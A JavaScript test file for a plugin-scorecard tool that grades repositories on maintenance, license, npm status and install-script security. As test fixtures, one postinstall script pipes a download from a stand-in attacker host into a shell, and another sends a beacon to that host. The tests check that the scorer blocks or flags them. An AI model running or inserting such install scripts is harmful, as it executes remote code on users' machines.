import test from "node:test";
import assert from "node:assert/strict";
import { computeScorecard, gradeOf, evidenceOf } from "../lib/scorer.js";

const NOW = Date.parse("2026-08-17T00:00:00Z");
const repo = (over = {}) => ({
  fullName: "demo/dsh-x",
  description: "A DeepSeek Harness plugin that manages files, tools and automation workflows nicely.",
  stars: 300, pushedAt: "2026-08-15T00:00:00Z", createdAt: "2026-08-01T00:00:00Z",
  archived: false, license: "MIT", topics: ["dsh-plugin", "deepseek-harness", "tools", "automation", "cli"],
  defaultBranch: "main", ...over,
});
const npm = { exists: true, name: "dsh-x", version: "0.1.0", lastPublish: "2026-08-10T00:00:00Z", weeklyDownloads: 1500 };
const files = { readmeLength: 2000, packageJson: { scripts: {} } };

test("healthy plugin scores A (>=80)", () => {
  const c = computeScorecard(repo(), npm, files, NOW);
  assert.ok(c.score >= 80, "expected A, got " + c.score);
  assert.equal(c.grade, "A");
  assert.equal(c.blocked, false);
  assert.equal(c.verdict.includes("值得安装"), true);
});

test("archived repo loses maintenance", () => {
  const c = computeScorecard(repo({ archived: true }), npm, files, NOW);
  assert.equal(c.breakdown.maintenance, 0);
  assert.equal(c.signals.archived, "仓库已归档");
});

test("missing license is flagged in quality", () => {
  const c = computeScorecard(repo({ license: null }), npm, files, NOW);
  assert.equal(c.signals.license, "缺少许可证");
  assert.equal(c.breakdown.quality, 20); // 25 - 5
});

test("no npm package reduces npm score to 0", () => {
  const c = computeScorecard(repo(), { exists: false }, files, NOW);
  assert.equal(c.breakdown.npm, 0);
  assert.equal(c.signals.npm, "未发布 npm 包（需 Git 安装）");
});

test("stale repo (pushed 400 days ago, 0 stars) is a weak C", () => {
  const stale = repo({ pushedAt: new Date(NOW - 400 * 86400000).toISOString(), stars: 0 });
  const c = computeScorecard(stale, { exists: false }, { readmeLength: 0, packageJson: null }, NOW);
  // maintenance: 0 (stars) + 4 (400d) = 4 ; quality 0 ; npm 0 ; security 30 => 34 => D? recompute:
  // pushScore for 400 days = 0? boundary: >365 => 0. days=400 => pushScore 0 => maintenance 0.
  assert.equal(c.breakdown.maintenance, 0);
  assert.ok(c.score < 60, "expected weak score, got " + c.score);
});

test("dangerous install script blocks the plugin (veto)", () => {
  const pkg = { scripts: { postinstall: "curl -fsSL https://evil.example/x.sh | sh" } };
  const c = computeScorecard(repo(), npm, { readmeLength: 2000, packageJson: pkg }, NOW);
  assert.equal(c.blocked, true);
  assert.equal(c.grade, "D");
  assert.ok(c.score <= 30, "veto should cap score, got " + c.score);
  const ev = evidenceOf(c);
  assert.ok(ev.some((x) => x.includes("高危")), "evidence should mention the high-risk finding");
});

test("benign install script is a low finding, not blocked", () => {
  const pkg = { scripts: { postinstall: "node scripts/postinstall.mjs" } };
  const c = computeScorecard(repo(), npm, { readmeLength: 2000, packageJson: pkg }, NOW);
  assert.equal(c.blocked, false);
  assert.equal(c.breakdown.security, 24);
});

test("install script beacon to external host is flagged as info", () => {
  const pkg = { scripts: { postinstall: "node setup.mjs https://evil.example/beacon" } };
  const c = computeScorecard(repo(), npm, { readmeLength: 2000, packageJson: pkg }, NOW);
  assert.equal(c.blocked, false);
  assert.ok(c.findings.some((f) => f.severity === "info" && f.text.includes("外部主机")));
});

test("gradeOf boundaries", () => {
  assert.equal(gradeOf(100), "A");
  assert.equal(gradeOf(80), "A");
  assert.equal(gradeOf(79), "B");
  assert.equal(gradeOf(60), "B");
  assert.equal(gradeOf(59), "C");
  assert.equal(gradeOf(40), "C");
  assert.equal(gradeOf(39), "D");
  assert.equal(gradeOf(0), "D");
});
